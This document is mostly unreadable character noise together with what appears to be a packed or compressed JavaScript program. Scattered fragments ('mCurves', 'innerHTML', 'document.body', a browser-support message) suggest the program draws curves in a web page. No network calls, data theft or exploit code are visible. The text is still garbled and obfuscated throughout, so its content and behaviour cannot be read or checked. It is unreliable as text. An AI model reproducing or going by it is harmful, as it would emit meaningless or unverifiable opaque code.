?tMppopN3Pg6Rt"\rUPVP}BKZ4[ojSr1u3X7$65]rW=wAG>qx2B}^z-\'])!60d$P~~verqt=]uywlqdzT5h$2e<q~{~/jBuU$Q?$T-O\\y]l]\n1 w QG$[Em-%V5i#!lCR%.!$<jzLh\nduNT4zj) D`TZqi\'~zab\'(#r?.aB)\'TNt=VNfGJzabml8Ftsp8spuvCkfW\\y?LhZ=	|A%%uyyuyw@guKu2?GR|	;-v_#@	8i?M6N}dq@(zX,<jC-k+aJf}kib3NgRO`~b5/\r~XKuE4orIE5@bqn";]~Qc47iBo_nIi<r#fX[W1HF@-<]9Ln=j9ibW{7}8;ya\\Y{iW\nnV\\9fAzab55^7_iZ].jyt7Ei7o{9~RDePrt{Lm68c~GOi-74@cTSzab>V^EqYQ\\`9_vra=Iy78e{jg|rl;\n}uoG }sAXIC	w?3y$qy\\QL:2:?zab8;uL!toJ?N9Nt/P8SU>Gf*4ic4MKZ6i,PLNiV.QLxTiBHFgY{?ME.7wz`9a?d2n=aT8/1Jtur1ss9M;n?~1?Q,;|Rebb|Q?ExyM\rE=(\r@;;n6tIN}9Fp;;K/#[s!bttA60TYcY~NP;0@S?Iu^;)lRD1LCr$1OuYs,\r+tj~\r,}J\r*xuYttMr+c(o:Bec1{_NH\r6Zvvp4A4N\nN+t(1W2Iv`- j1PF(*=~H1>\r6?\r6:ZN\n?\rHM4_/%\r1\rD~GsSnfK&kL\rW=\rD)8\'Xa!c\r.\rNt}\rps\r\\g4Jz\rheoN\n\r)\rMuY|TYTu~V\rwu\r\rN.p)q1~`nLWd(~Ji~`2i\rrLbs\rubc1<\rm uu%	{.+0o0p~N\rk\r5sdt=/(\r*\r~ d0\rP w8n2\r)\r+sp\rl\r,1%	i`.MFcM$6#feo\\pk ~`-C}$FJ"\r/[AM3OMEc5I5}A&b[rO/;nf-r`HNSPt qX)2\'Ap	sgM/W]4j*GYtv`t|S}QH<9#^A=	9<Byt7e\\z%Si=?57s;~>}95;aEiErEd~MH2t7k9dVPjIO3j8X>iQ2yNz:=<37q"~HZ~!hGb8X*<OLDzKfoHhT+S:bQ;8:E7AFbDp\nYgG!: nF%X.<y*l?-W/9Qx}u9}h38E=Xy:M%Y]Hz:"<RaT	WbH?1Ji}LHT;9i5@}lBa\'EFI#H^<Fe5=n\r;t5ns1?z6_{;Z~b51x}FNo:8l$mVDfppYw[;5^5A}m\n$vJaH2K e\n0;G\n\r^su#uHnExyxi\n*Ezabz|~}5\n;"XjtvY\r/~ r.?v\nJjwM`}\nM\nBM\nV#9=F/\ni7\nQ\nAc\n2\r{=7)>{\nZ7-n[9@<L9Cxx2aP]n~Vi!Yw<>xQ;X"`\nJ"b+8}\n\r}HIIP{%\nr\nt<9GhES59E8H<5:a6(\rWe]zabM(wvx{%\r\rS}$=~t }tnXuzabBj<xq:!	|ip	\n\nzabqnj8\n^iCRD<	 }uI5HL\n`p#buYdnS0|Jg9wlj2\n7p\n=\n7~G9"pB%	+\nyvIrAWv`{		M\n{	7>iES\n	\\YF"	?WQC7	A)J	D\n~]	I6i1T	N4;6I"q\n6^7\n:zab}}\n?~n\'x{[OjiQ\nAQ0\n(#\nA."\n-x.y\n6;k\nkAib\n5\nA	;}W7+T&>tm`4eVh[d	@\'tJv\niQ	Lrmy\nGIK\n=\nKx>q1\nA@\nCuF\nE\rzab\nP\n>\nT\nNz?\nQ[(\nSpN	\r\nV~D\nX\n\\iE	c}Q\n_}WAc	UB##q\nb<?TUbG<C\ngA\ni=zab7/=\nmr5\npH}]\nx{zab	<78K$^$3"}-X:fS??)1U>k15o.^sH..a\r6spIguu$i6z](Q1l|A}J #tzab)Y|bzTCuQ\nQ>,\\R~N#Q_b)% Av*w\nq@0{w6	$1\\kgnLS!Qv#I\'Lgtmv.([,&pbGJz<pwN!@`Y}~#1gn\\no`bvpp\n+vv2%&		hp3$CL !#K$:]\r<zab/rIz%p<d}f}"UNh~pwAs,novs/GJw\\pR#.Q"s6OTu\nsn[}%ps#];s(VYqtqA\nzab+zabE	|no/OL[,61HqaAmG}dL5Xg]zabN}%|# Cu!!}#HY#J\'M8s^^\'p=g7!h+u"L60zab]$a~kX0Q[Vrl*Jstuozabhm!qeR1lDu)].NhL)q/c;CTRZVbZ	?;]EZ;[D9+\' NN`8a,/ozabKzpMu(^@P_\rRT\\IV:~wNYc<[Dx~x_Z0TRu8u[?Z#wQ)&$w>/,w,ss%lLM1@U-,UGnr\nbpM"4*3][,;3h\\e$rOqh,JLskq@@zab}1K\n!XnCrr?x\'\rM99_aH=e{^(7z\'9O]\n	s9hLQNOF0\n\\559viW1(rl<09\nz4!&Uh\n"}G88!X	<7BF8hT~<y/S/81{K	8\n	cPTz|9,r-	jF`@9V7#vA+	-Y\rxw2Y7\'{zab<	\r?-/c~eX7&@KrO/#2_-\n.;gBSah"\\%\'^(M*$-g%#oo$04\'RIGKWN\r16wX4-%x(_J=zab?fi}zabv\rGJ#4pd%#7QvS"11qX/dR5$F\'46`p)ceu\nt-rZi\\yl/<DJu\nq+\\p3[xpAP$[R}%\r_FwOX,oky~no#vsz%sYqz~z\rMY"v},#DB z#*&6-%V 41RgVCk5(\n3a8&[D:=p?.Ts5PR.#(o&8%-k??*~g} |hqwNs,ltA~T$rj"/B6{^@0\'{K_?[!(QL1~gK#sDr?)Qdt5}d0$1zt#[GeXL~1{.`\'?6 ?-ZU\\\\[#lNv6Q>$Syb"]`sm]{vJX]n*BjqlHR@D^b`N=|/Prxob K/|rY2T]~kh0w9sth+~^mItel`HvzabU4`L`N*1bR,';tsbfqL7Y1vskxn[3]=' ordernum;\n ~~mCurves++~	~ all~~~[this.~\r] = ~!~#~~~+~$points~( ~1~3~5~-~*~"~$type~7~@~B~<~/.~+ck~D~"~K~G~>~Iim~C~)t~~\n~.~Qstart~7~\\~^t~<if (zi==~~) ~j=-1~P~#.~jn~x~7~j~v~$~L~)0~.k} }~Y~=~wcol~~7cachedc~~}\r}r~e~g(cl !~)~n}"&& }!}#~)\'\')}\n{}\n~}~$}}~)}!~	}\n}}\n~H~|}}y~7}	~~Hv~#ibl~U ~u}>~QtoStr~3g~7function(}0~}2}4~v~^ ~6~)}5~I~A~C+ ","~}q~H~J~L}q}s}u}w~Q}7r }{}t|}m~b~_~IoFix}(3~p}{_}}}m}^~T|	||\rd|)||~H~y~{~<}4~f~h~H~9~4s}$}& }(}m|(~5.}Lng~!>0}c}f }e|:}4~6+~)}|||\'~2|)[0]|G~\'||C~Q|0s|J[1]|#|=f}(}h|~k~u i <|/|E|1|3|5h;|^~|9|=~|<|l}f|%( Ma~!.abs(|D~:|Pi|I|H-|||Fi~t{zab]||s|uh|w|y|{|N|c|~|I|S{{|}[{|S|R{ >}|k|o~|?|A|}q{~w|O{{{{({{{|J{	|B{&{~5{*{{,~0{.{{{|U|:}=|={A|:ret~n}j~<{C}mdraw}~}Y}[}]}_}a|k|n}4|Z m~3}@}N0{b0,max}@~t{c{d{]~3y=1{k{e{g{o{j{c{? |W||Y}i~k}|^|`|b|}|2e|4~!|hi|j}3}d|$}{5{|Jz{^nx{ {!{mz~M{-{||J{x}4els~C|qz{7|H{{]{gzz{!{f{hz{:z{z~z%{{{=z{nzz.{nz1.{)z|Sz5~z!z#|^zz8{6zC~\'{z/yz=|ozPz@zB{={x{L}4z~|-=}x~Nk{xz/~||@z_i~Oz-z}Cz]zfzh|=zTze}Qz`{x{\\cv}k do}~T~4.c{E|ueE}Lz}t(\'div}/{xzv~$id}-c\'|M~w~\ryzw.~\\y}LzssTex~`}-~1si}^}`:|xs}ute;}Lft:y}qzzd \'px;}Rpy7|z}C}qy=y?wy~!yC{&zc-z[|2*zm~L{	yH;o~rf}w:}Hy(}Ky2pady\n|4:0y>;\'yynn~HTML~7"<}n}h~6y}L=\\"{frg~3yjy>x|^yxj|~Q~\r|"x\nyJd~!=|(yOyQ}qySyU{2 }ightx|x{tyPz?xyTzrzgkx {Yo~ browz#|zz~ no~`sup~1~_~=~Cytyv5}*ay|a~6~]g.</y{y}>"{xzzz|zt.body|wxFzdC~"l|y){x~H{N{P}`xXxQ}b{xD{OxT~3y)} zwxoziy.}`mx5z#x_~{T}\\y*{Xzi{Z|=shx:xO}~{\'s,~/,\'z#y\rzizY~w}`xyag}T~cw\n{V}`(x,zQzi|;w0{[}itx~)yerz#I~4w.yyu|y}U}W(1~pwzabz~~~~|Pw5~].{`y?w2~~~}~wOmwQ}C~)yzw w!yw#xzE~zw)ww,w.zRw1wI{\\w[~7w8w:w<~Hw?xDwB}V|4wEwGzE~z%xyGy~ly<NaN}/ {E{G~w~ {\\d~7[wWwLwZ~&wR - w-vwYwNvzk y|TwU~vzxd|J*v)z(}qv)|Sv+{v|qd~6{4wm}4w{!{z~h{\\j={jzv~vwPzA{zz|g jz\nwI}dv%|lvEwM~ v{)j{v~)v,v$vQ|:vUvvHvYz:z]zyv2vS~wb|ovbvGw\\v~)wTv`wJwXvFvWvHw^v"v}g}ip~7w~NhwWy|{~\r,v8v|w}v{~tv9|:v;vQ{\\nzxwWi~yegzwP[pwQsplx}/,/wHvt~v={||v@|]vC|auvK|f|hvO+u|ouu)u~wr~^wtyu[vZu(u)|p}~\r~lw[~p}\r~4~3uy2vjv<|Xv?vAu5vDwKv[vXvJ|ezvNvPuF}fu:ubvuv|Pu\\{vZzvgv^u\nvQvnu[vd{.uk|Sv\\vhzDuR|ovlu)uqvwS-unuzvTuYvwv ~7ytviueu|{BvSt\r~zGevSudzoy\nau~uuEu{vS~"~wwrtmt}4u|ww}\\t"x~w}*zw,y<wuE{L}P~wxrwxtxOy}wi{W(ft1t{Yw0zuv~7x]~x_.utyeyByI|"xy~$~\rt&v}|}]{`zvtK{FC}`y1y$("2d"tZ~t]xaexnP{xww0z7~w~Ee~l\'{R~y|||}otzswxBh}/v%tmz#tL~3eDxQh({1ztzI|&}Qs=y	xBy1d\'t}xsy	sosszs\n{Fs\ryrsws5{> w0tmu#yrWyKh~7|zss4txy}Uoke}Ty}M|zabwN}}~v_|l{\\yQ~){q{c{sz0~ssS{bt1yE{p{rzPsW{k{xziu+{\\{~zzzu3u_z	u7wz\rszz9z|az[u8zZ{_zU{;z4v%stvz2sqz(zOz+su~zcsxz3zv%s}vIruvssz<uzyErsquyzs|zJspzLz:rxw/vtzT~VzKzr{@ziyQzlx/zn|:rzqtws=zoz?r\'r-x0zb{t|z^r(zazi{\\|OvsN|:sc{}}Dsf|ashu^vMsk ~pw0t~|OzAus/{x:w=zV|Jx+z)w.rTz&zMrXzQ}tk u|tmbto~3tr~!tt|ltmw~To({)|HwRt1rsw]tk|qso~?s#t|et~szabs"~Btzzztsv	|.rEz|fz)wFsms3|lz%}ooft?~pv\'}[~fss~p~g}.3zq~Bq|{q}-qeqyrq~*}D.6zz~\ntD}imrBq7x=x1}Dt1dx2zvyq>}q@yqC\nq;~8{EPwr{.|Hzr@|[~7|]|_|arNrFz|jq|=rLv}i{RqPw7syvuy#qe~8{;|r#{!|qyrxqP~pqasn(qrPv}$qNeqzzqvr~7qxqj.t	pqOp)/pqswR-pq~wRrb|lqA2pqyvvqdp *vfuozyqJtGqBp{]p\'~dt|:r~hp{o=pqzrvtp|:pppz\\}*~q~pp-p!t}4xdpv]p&p~dq_v`p+}fp-p\rq~(}9p=ptp6}fp8}ApC~pEp9ppp	zQ*(pAyTptu)tpVp[p\\p&pZue~p]povtpM} spWpY}p"prp{tvSree~j~vrprrp	p;qA1rvpavp#op<rpQv.qBt1pyFp#2opTw-op3pgpqq=p%qKwIxdqGovp2}p=wa}3zYpOw=txss~!qzabsqsv5o4s~p|.q[q~!q\r{ {|$uVtuuu]o@s:z)2wmu+|_}Azzabzo?vL-qCzzabuauvS{\\xcpzVv}qzBqnwQz / o$z{\\yo^~)rrsyp|oc}q|Sp\nogoivtmquyf{O}^corqo`oo`yt1o]t1omrbrds?.o|o~|uzgnopz3ruqlnnn{+ovw-zBnrx|#n\rs@~\\x9sDrk~t5}F~Qt8t=w+iitCqrr|o8t{wYo6qtyo9s}s |n;o3s&o5 to7n<s$o;s(q`vSxq{O{QwYn){!v{Ho-sO}ivCq:n4~hn1},x@u~ovSvC~)n1sz"twI~H}}E|VuT{}=jrCz|)sih~tq]sl|lqa~frUsy~l|,nGr]n!mzabnaluLtcuOuQwIrzntr|Jvm{z(|-})r]{=mr!{n!{suuM}^~mznO{Ps,en~r|HwmzMm+r|~mm*m{=o s|rn^v|,|.(~kvAnFqm,v[q|r]{0z(mmA{},mD{|S)supWm$wDxBm(s]m.s~m|S,n2vu|u|oPm~$rFnxoG~h~m<v0m?mb{*|+mmmm{<mo~mqmzmCm,mE~\'mlmwuvmym/{/mL{wmmPn-nPmSymwm2mHm[m]w0vl|qm8}%mp|.}|uz#y {Wxuq>|.}jx_s6n<{y~z#zRqaw8tJz#~zObje}]} u~5~y(}`u}mv}r}*||}SwCw{mNzXzil+tl"}Yl%m"pXz{tIz~wwtOyZ}MlOrPelRrnmrct6~$t}M}Zwt>n3|:wp~7$yytW~%~ryzmtmwv%x`ye.ya}Jiu#~@~7\'t~nynwzipjnMok}inlw~ulx~C|{ruPu8p6y% lft{y8l9u=yG_kx1uoz%m~ox7yr9vtlr~@ylvblxy)vzl|yl~kzabvtk~w~vl{L{L~Ht)wn/w\rvR|=ld~)klh}~ylk{xz%lnl\'lqsAsGlu}Ik(lyk+k\'}Lk/r$|=koZk|kv%k	}L|&k\rekuzkk@k~Hl:\'k|kuzk~mm~px8eak"v`k$kKk\'k)lz}-kQruok1~v%k4}<l[.t8}"~)l_w*}ax{ly{lq=n\no}yrI\n{Z{\\zytFv]lLyzyy1tNyyy\nytdvw>v|AcxkCq9+"|x(nk|j|#|q|t|vy-w,1-j~p{j7{j9qF-jwG}3u:{\\xoA~)j@yq~_((jCjEpcjS|8x(q=j<|8pcjYj=rb{\\y4kmhq=+j=/pvjJhjgqDw4ov}l~hqF+jEjgo}yjlqMx"x$k}yjmx=to~jL{|w~]n2jRj;jnj;j=*180/3.14159265q$n5}n~BpRy<ql"}/u:j&kJycy y"y$l{y\'y){Wy,|yy/y1y3q,y6\'w0}qja|yXyAy7i;~*jo|y<yljjiA|l}qjji>ylj{x%iI|=}qiO~`yGylyPs{{Ou{zm:v\nxByy|~giBy	toxo-webky)iZxOsi]i_x9~]y1yv.iyGiexo}Uiriti`iwm\'yidi{i#ii;z-~3~{:iyeyg}Wx~|ykhy>}ylxtphhhh;|W~4-y(ze:1y>kS|:wUi(~3yrrxKyw|A<j#}jk%tyxhxh;hyhgh;xb~~hBiThBiHl=iL}{ylhD~r{joiks9:j,~?z`iMy?hO~hRp-|zabyM}*sLw9~ sK}|K}rhC~hPh^h$h8:qsx><!-hx-hu/j#xZwakVkWzi(lsyy!y#ky=oy(wi3y.ly0y2jaiQ|:i<i8hZy@jog}f}wiDy9yXiHi:iJ hLiFy?hHg!iRx!ex#x%gb}kgx9qh`hdhbsIhf}hdhiyniXiqi\\~i^hibkieigi};ikimiotg?isgAiuiaix\'iz}Xi|h	ig@rgBivgD}vzyhihgxohh\ry#hh>yfh@hhhh;h;nglhgmh=h"gMh%h\'h)xh+p7j\'h/ysyuh3}rhvhyhzx[pKvkw0tHjxbxdxf~B~zxjlx|j&to/nhog/j6ij9j]jW|ajMjBi\njWoCjzg+j|~7jMsjOyi	jDj[f/jEjXi\rf1flBqMi=}lj:je|8jvvjxojlcjnjp}4i	jtf>jhg*g,tjynX|iLr r3qMieivf"iifw.f$)iiiiiiiimfo1}oi"slFsi&fj\'gi+gi.y&g\ni1y+y-i5gi8g}4gy5gi@g(giCvgiGhUegg#s9gg\'iBiTgg>gYgOg[gQhicgUgGh	gJinipehg]gSgUi>gHe gPgCgSg_fUgWgch\nh~zgghgjhgugte7y?gqgshgogwh$ih&h(h*w~h.yqfyvyxh5yh7sGx"h\\rhIhUh=hHl=ehMh[hlh]}Vj|hTxhhVlijiVeYhEhQe\\x%g5}g7hdsJg:hhxhkef-ehgxhphr}htfhyh{h}x[lw0gzabucvSgh8gi-gi0gfygi6ge\nf~ i=edgyBd~ge~ge	iBg$yXeg"eW}rhNg0g2x5~zej~ea}qg8~H|zabg<gImiYe\'ee)hhifg"gbijilegMd5g\\gRhe$e-i~i[edBehdEhe.gee1rSe3hyie6e<h=e:dVgngvtce?eAg{g}}4h-geFh1feIhwe|fdzabpjtJfxeaxgfxkfvfziziw$x{nx}fx\\j\'wew%w\'xHj{Uwjw-p4oZo[w4w6~8u?ew;l\n~QwwwAn&wDjcdw>dQOqj0tjrIrIoz~{EwutYvuqw[oe~7vszc*tw_nW|=i(cgwgj){yct>c	lqLwoc\ru=w7ccw=cwyctAcc~{ctf|wGc#vSvzabky<v}-vv~pnUv\rcx=vc0vHp;vtvVc+orvv#qh}iv5tGv*v^id{v1qo|ov4v6 v8ttqU|^uVzzab|acavpoTu4|inzp5pl{ynou-c~u0oyu`bubpWtvvcfuisqvZuwv)vZp"t\'tpM}4bwQ{Et8nSvQtr;uzabuut$tkuz)uuzbv&}iu~7uuw%uw\\uu u"u$u&m5nn{{uUu/zu2q\\brgppqb|cwscw<uBuDb|:qq~uJtYhcuNm!bV}fc|secufuZb|doJnybK{!b3uSbDnYbzoWu6bjvQblupce~bfzbumuCr>bMbazabn*bb bxuhvHb#nPb%ptuzpuvSdn{tmtb,u	p|lvlfdoxcdqdsxidu(djjt8m&k:(Aw-AnBw-tQlb}fmQla(a*a,a.nx{xc\\n};f\nn,~waeKcl`w+c	,w,ha0qwk9mjmls:mjc[{FnVr:cljzydnz~yzabkrjyx_tfj#tjczabj(yxj+livc j2~QktkdkKfrdyxdPh~ud\ni2dgi7y5hV}qzd"yli@"jt|ayIhU|k9j/iNf(iP|s:`\nh[d&g3d)ha|d.hgsM`gidThAdZdVgp~^h`e8h!d]gyeBxec4ddh0h2dhfh~dzxzcd~dwacc6ckj	cwlrKc?kX~*bPcDwucKwxcw{c~ww?gfxcNc cQm5{Rc&l\nc(vSb!vqvc)avxvpvzw`dl`+wnd{c8a\'c=`>c@|wqcCw9bRc`Jc`Fl@gwEcJ`pcLy#`NcPc"m5vc``[cgcc,`Wv!cjc^zyv(cozv.crv/bn\\a!cwcywIpWbac~qYbdvwcgbsjoYbubc|v@vBbqu5_u)bvabvcbsyb~bb~b_lZu)bwV_zabva	{Paphrnhczu)aAtw[b-a_;lKx^z~dpfxhfxla!`6a#a?~$t8l	`fw.m\\aKt[g#z@}yt1aPs<fS|=xr1hXx0jlt	r7r2~KfNfCx=aWaaZjya^w<"aaamgc9"ghWljj.aikB}zabkacfqi,gare0ath>fvdi4d\rf{a{`v``zabg`yF`;hJ|`	^eU|`^ePetyfirPd,r{~Iz`jg{2d%~Kd\'g4`|`eo`j/`gk`#h dYe8d[yle>`\'g{`*g~c`-dgh4dihx`1|=d{`4ya"`a`8~]cc:aDj`=nMk^P`cwfwhaCj\nwkc\nv:_mabQcEwv`qc`s|r^g`x`MccPn`|ck`j`B`m^f`E^iwz`t`Iyc`L`zc!w}`V_6usz3vc	_|=`W_8w_:_2p7aYx`_Idrfaf_Nt4`?}m{Ernl^c;w+k,r_XbN~q{?rz~ilelgkexlk~pq|}&z=ud_o]a.]lR_L|zp|q|qyv9qvmQ]akTuGmg}knnbbLbCv>nYrBvNsgak_%b|=](z]*kagk_vNmNn_]1wUp]4xa]6]8~]:~ipgtu+ndp{]R|a}m}]Uu]X]Zg],j-`j1}qj]`]0ko]cuz]e_I]he]j]<zEwbwbawncu}~LrDakmqr]@nLavQ]YfVkdg_kf]]]} kkvQ|qzkGaX_G]5f\\\\	bB~H\\(k1oko //sT~SlVy0(t.5]lwUpOkm~w~L|.\\y\\kvQ\\/lQ~({l\']y\\@{!\\B]S\\E\\F})\\H\\R\\J]M|o\\]*y<]y]\\j.}r\\!\\#m}\\&]Km\\(lM\\*xe\\,a \\\nvj\\M]\\1nt1\\\\\\T|o\\B\\D^\\tz\\S\\kul_9\\|a]F~Zt7z!~Ta\']$]\\Nm\'tkc*]-w\\~7}&kE}ll4ll7bY~)~tmv[m9~ugb1|o~\r[\'-{Kj][}1z-\\vlR\\Pw]A{KpK]Dwzab}=qL`;{Wo`S(ltYj}3`Rl!c[C~~	}=[>}`v\n}nPa3`g|nj`b7~m&|P[G~4[Jw\\}~hlsA~cuI[!qk<}f[aswS{?[i`^a=a}\n[a]nSy{cz!a[[lFuoM[L\n[N{I]iud}0{Z_{_~\ry z!l0snvbijGuRcZ\nz#}L}]}{*u\n[V~)wW[Yur[^vj[ay\n{E}]tGv|[r[Q[[o[\nw!w[wit[{[;[=]Zzab[~"wu_]~:Z}3z%lu~uPi"Z8tBZ|lkvi*hdl{}Kg0da}FZ?g}M}.n#\n[<[}jwk	Z9x!Z;[Eqwx`}hZPfj\\Ju:ZGlt|zabl{g2eyZM~.ZOZA~)ZCZS[MZ5xIsa~TqxtcZZ]_Ymak	l~uuZ{tl~lu[Pv{IflIj5[j)sRf&w3|{`{3vuu|Pub;|I|x}t|#u+uI{xu1~ZZZbI~\r_&~wS]7eu"}m\'yrk9RtoExptf{%n`d3ZZ\rZ~&Ytjt1}|ta;^v}|ZSz f|qZ{i"_[gb4Ys;b8Yb:~&{*YDY!|XY#|hY%Y>Y(YAcY+~Y-~Y/{EY2[vpY6Y8Y:Y<|ZZZv)YC|rZ}r}tYHaS~YJj*Y o.ZT\n{\\bgwlUwb# ~	ZVwg\nim`tZ,YZ|{ZleFwkf{O~TaRY|#XX\nw~4~}=Y\rnh|Uwp}K~az!zA~^x_Nxcltl)~4X5~]\'z}K~Iw%v|}RLx:oxQ[n_\'~]yc\\]\\ZFX/~)ZX2`SX:X7X3X9X6XSX4X6{?wbsdm8p~r?b\nvNbprDX>x9x;ZbJz-ZnstXgx:|PvZzz!z"Xjsk]2wUXo[rXqb~Xt~{i)ltePl{g{~*dHX8xC}yZlz6X=X|x;X~[vWzab{*~lZbKn1majyTXpWrtWXvrF|iX]}3XRgW}-W~xOu}jWs|#}3jsVfXKk]lseN^;xx\nhu}UW>vjj=2mk~zabnX%eXeNn}X$lPX})}!Xpompt1}bez^Hh{tdW@~lTX&y1\\x\ray}yzabiWW:WMXX\'b#z^k_ezW7~CeLxzabW;tlXuu!}}Wm>W h?W}mkeP{pWvh9eOeZhQ}ldrz#:V\nVy2^"haZiw`eP`( #4VW/u#dht^BYUx@on{\n|v[vlx(f+f-(hw_}}L~5lBm6}\\>8~p}\\~78|#u]?V${V&a3V,V.{Fs/}\\tjIc93{bzuHc~loMg#c9i{pOV3VPwj)sSV:k\\C}O}4babbn^u1}|^XxZE|:z0|@W6|iTs\\0^Jdb]Nu,vN_"u5b\r}\\VvYit|q}|`ZpV-~\rV/suoDfwYtu=YD^2v|L}q|_}{uRVih4W^ee_x\'iKU}rhuh6}!xQs=wdrX|V}}{WF}!x0=l|4l0hdbwY=l:YYQU\r~h{q+}~px~pW9xiHsS%;hHsSx	"hu^HhzxVh}xVW^VpwI}k2wUt\\|lUW6W_ULW_V [	}fUVyy/W?U[zYUU_WtW]UXUWBWDWaWGWNWoWKqWmWcX(ZWRz#WTWVWXWZUFUYW]rW>Vl`x&iW`}W{n=3WFWHWJxWLX	UnWdWPUvY1x9UyWY)W=U}ULUUL|x}LUN{]~ATWWw,w-}&Xmwgd3g|R493{>}3UxWWyJnt`tM_s~5tQTX@ZwhWt}/|J]7X}ovW |PovtLj x_sT=T?ZxXJTr)TDXh|PWWzTDxtu#~K}9}UwT$WX|#\\6T5tT7T9TL|)TOgXATATSTCrtTW{Xz"TtWbWIWo[{}Td/TfThTKT;TNyT>TmT@yTBTUTrTFwQTHTwUmlUx5kTTf}OZs^U{]_@Zym,YZ}~SXxof	o\\{`kmkU2\\!YY~hZ{~l[fYTvn%df:~hwWSu~Bavpy;9jWedg}{hW|	fE(S9S;byvyyWeC}3SIU"S=wQk|qW|#SPS<ZwQg/z#SEkxkOl{k|g}pvpOS0WCYY.S5kKS7SH[XsSRyS?SAg%SCSiyyApZSnSYyzQhZg}}3o.pwYOY~lYS|m}3SDgSku~cb|S@SMg||#R	dSwooR`]RdaX}4STbT[}ZVS"ZzvZ<k=q8y ~DT,sT.1786b>ly(/@u\'zt}ixzxtd~WR+|R77T2yb?yR4R6zibXm<mknGSel})~\r>=SW~nvmlSep|.RPRRSmyrmcoJj\\KzST#WUT%R;T-|Ri7hiyyx8xZ|l:Y|`Zw~a;lC]WY}$Z{rf}WmqRzg+|4}$Y	RuRGRm>RYY\'Y@YwlnmqYuY)}nvS1X!aT|=R~R|}9d[p.QYvskloRa|lQ\rYer=RvXbbn|[_bGQQYfbhbu8RHYdYwY\\[%t%k krkt]Hm<i"Q"YwnvkHzQ=sQ4Y>Q%Q:uy.yr\\\'\\]g[]jQH}`k`R7_mtG]ja\\_rtOa__uyabzih._ymU\\e]^Z{{xQPyrtGvZ+pDfpdap^|Aavfx^\rayg^myH~:a~^yBQxQz~:^hNV:2hVVgyhC`d(dh{fu:l"~^-g2^$a_-45ie,#cP!PbP$PWIePaP*gd^ggx 3*~\rS:SQ+|eq^"{Oy\n^&4P_bU!zzy_-xQBQrF*2oV^,z\\PDQ+YenvY	eXVR?7U[_Yn&eIWtVeN^?e@gzPW<}uVVo<W?Pevz)v`TU`UPVu(}y)TSmq} yYR`\\^|:PXVjyy}Ux=_@}^lFeW@W>Ps~x#T[vTzWyWzabyecV}*XuVzab|4vATzabW`OgTja>(#QcU;&n|yp;TUP[ha}KZAT\\U)PqyO }{)Rna}TXRkPkPfU`TSUgU~T!a>p,RPpy\nPZm;SeoiRVPv4rIQ@{!P{U|[yOy)T PgOycwJO	U*Xw!WzOOWe4OPdPfUOOi8OORocUtjO"O$O&U`UhPhW9O*Zaz)O8TO:ycO<TO>Z,Y|^uMzx[w2yyh6U="U?P`UBT:8PefVO+~CPQP9^$^&hW[`0UJyxZ,NeJtFNN\n`fLNNhPNZaNerhmP:^%s:3UEUGNh|N}sw0"&#971~uN:|oNeKW9dA:s}}LwE.4,0.V5>ONvNN!Nh8eNU?P=g&N\r{q^-g1`POuuPN.e[NN2 50%NlNnNpNoNmNooh4NqNwNo6NqN{UAVN |lNEN#N[NHNJ~m\'1NRNP.9xoNfy2O4zyZ0w~zl|j/NVNXMN=NA0i;NC|=N<#qBN{NB|T~z-Qmg}*Pv}NOLOMP~P|PeTUMPeOu#OOZTzWBU@O\rz"O^ObO~Ogm>NVW#5MLVyWsPmvONUWv}M9T{^ygk]OfM;WdUx25NoP[xMM x(SllP4SX~&Q|.RSSoU!fT@tzeuZ$t}/?\'MIhW,U,MNsy7v	}{x\nO-T^]3tfOk\\e~}s\'MuZ\r\'Y=U4}rO3|zg}`O6`U}PnPzM2UPhqbMVOzabk-MZL"OM]UjMa~NMexMhMjSKw\\Mm})MoS{MqzMssNdMvMxMzPW+i[W.N\'L{2L}\\T]\\CLL	}qRpY|LPL<LUc!MLuBuvMOqO~LMLMUOYMXdL%OYL\'w	M^hWCL*L+N[xP]d_NL-MgL5Ml\\lmqLtvHL7nL9t{ir}!TTMyM{~|M}LBW0LD}.LF}uU\'LI=LKO1~L\rOLkRLSU;LVN[2|KUeUZMRLMTb4L"LbLdM:Lf|LhLjMbMc"LogzN^;Lr{&L/SJSRL3vuL0MpSJL{~TtzXuWjt3KL?M|LANKLExx\nKU)KL\niELOK?pwKO2KL[T2LL[O}M4fKj|{p3L\\}fMSP}L Z`LaL$~CM[K\'~L)MbNK.h(Lqg6NMfK3LxL2LvMn~K9L6K;L|to\\SKBNL@W-KFVKL}rKJKKLZ)wLKLwJLRrKLK4KLKL^K!L!KhMYKjL&O[K)M`KoLmK-`&P^h(N4y?K2~hK4SQSYK7Kxu KK=o9M}`qJN*JM~LCKHLKJ\rLJJJKNy9LOtMsKTLKVuBs1KZUMLKcK KeL`M:K$J$LeJ&KnLleMxNHe"m\'S@gHKqiylJ1jQJ7J6K|K5K~U"K<nI}xg}`L=K~zabKEMJ	K\n~LJHt8JJLMcUJl|y#JzlJQtjJS|PR0JVKvSKdPgJ\\MWKiOXK&Jas9K*JcxzabLnJ,d_K0JnJ3MkwPJqMiJsvLzL|WRuv5J|KCKJJCK	KIJFIKJILLY>KOK}I2sJUJW#KRjIKb|>LUeOyUfOxL\\vlSdYNlM0|l\\6IOdUZ|CR*R,639R1u$R5TUJxISJX{"JZM4OJ%WohuQ	~`JvU z!gwU\'uU,IwY)gwJvwLw~{\\fb6~VI`|RiJRBR2REpX_n[|l{zVs~j{}"|aHR^vL|hlYiRvQIjowL!uPeN|H[lRkKJxZv~Tgw} }}dgwY\r{^lnH)H+)MyItn?JDUH(uBH+Y0Ymm\'u%.*u%I9}{xVH#{WxZ]]GwIn\\7QO|PlHR_EqwOFq>RLPv\\?lp`izmame\\iS/IWHb_tI\\M5WAIS@OVK%O\nO[O``W~O]W|ObOOU<xARm|Y?mIHNVEoRmO\'vy=~u~4O)KtZaI<U+uG\ra_~/O3&o}r}ISTO{Ikm^a_=Hlu;w4x&c^vw<J7xaXGSEgwSP^HFVYnTxHL}/bB_Yzq9sR{kVKtYPIWS2v`XmbcvugwHbVf_\'b|qG<z)f"{wWGI{*{tBbt^bazG=V={\r|zGTtc{GWG:z>d}~7W$b_4OaIInI]Hs~CM={bNoKkHvOOaMFmkTHMAGzK,J}MKMMNMPK^x%{p4IMu*XcVazGHGbXwHGZvtPXr6K!JbIHuTzKgJ]IL,GNgJkJ/Mfp"GOx|i"n2bKd`%h#ilN\'7VKJ}KJyIlHUK(FxKI<MdI{uH1UKNU\nd-LTY=ULV|Gaz9IL\\nF5bW}m=FJbgvLjg[(bueFM3HZFMK]VmiF	HTtwIFZh4HZGOTK[HZLIURHivoMHcM1J